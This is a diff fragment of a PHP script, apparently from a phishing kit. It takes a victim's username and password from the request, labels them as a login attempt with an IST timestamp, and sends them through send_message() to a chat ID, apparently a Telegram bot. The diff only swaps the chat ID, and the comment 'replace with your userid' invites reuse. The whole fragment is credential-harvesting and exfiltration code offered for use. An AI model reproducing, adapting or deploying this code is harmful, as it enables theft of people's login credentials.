@@ -10,7 +10,7 @@ $password = $_GET["password"];
 
 $message = "Username : $email \nPassword: $password \nTried Login at $time IST";
 
-$chat_id= 5640672460; // replace with your userid
+$chat_id= 5606597493; // replace with your userid
 
 
 send_message($chat_id,"$message");
